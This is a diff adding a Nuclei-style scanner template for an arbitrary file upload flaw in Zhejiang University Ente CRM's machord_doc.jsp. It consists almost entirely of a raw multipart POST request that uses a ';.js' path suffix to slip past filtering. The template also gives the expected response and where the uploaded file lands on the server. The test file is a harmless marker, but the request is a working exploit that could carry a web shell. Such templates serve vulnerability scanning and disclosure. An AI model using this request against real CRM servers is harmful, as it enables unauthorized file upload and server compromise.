@@ -1,0 +1,98 @@
+id: poc-akr0z2k79atufzr2
+info:
+  name: 浙大恩特CRM machord_doc.jsp文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akr0z2k79atufzr2'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: akr0z2k79atufzr2
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=dudesuite.txt&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+    Content-Disposition: form-data; name="oprfilenam"
+
+
+
+
+    null
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+    Content-Disposition: form-data; name="uploadflg"
+
+
+
+
+    0
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+    Content-Disposition: form-data; name="strAffixStr"
+
+
+
+
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+    Content-Disposition: form-data; name="selfilenam"
+
+
+
+
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+
+    Content-Disposition: form-data; name="uploadfile"; filename="dudesuite.txt"
+
+
+    Content-Type: image/png
+
+
+
+
+    dudesuite
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite.txt
+
+
+    # 上传文件定位
+
+    /enterdoc/Machord/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
